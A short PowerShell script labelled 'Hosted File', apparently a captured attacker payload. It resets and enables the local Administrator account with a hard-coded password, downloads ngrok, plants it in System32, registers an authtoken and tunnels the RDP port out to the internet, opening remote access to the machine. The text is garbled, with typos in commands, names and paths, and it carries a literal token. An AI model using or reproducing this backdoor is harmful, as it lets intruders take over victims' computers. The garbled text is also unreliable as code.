Hosted File:
Set LocalUser -Name "Administrator" -Password (ConvertTo SecureString -AsPlainText "@rdpbyav321" -Farce)
Get-LocalUser -Name "Adninistrator" | Enable-LocalUser
Invoke-WebRequest https://bin.equinox. io/c/4VmDzA7iaHb/ngrok-stable-uindows-amd64.zip -OutFile ngrok.zip
tar xf ngrok. zip
Copy ngrok.exe C: \Windoes1Systen32
cmd /c echo ./ngrok.exe authtoken "2EO6JI4W5ASmJhMwIJfzC4LDymE_BQmRTCLTib1vow4y52bw" a.ps1
cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
./a.ps1
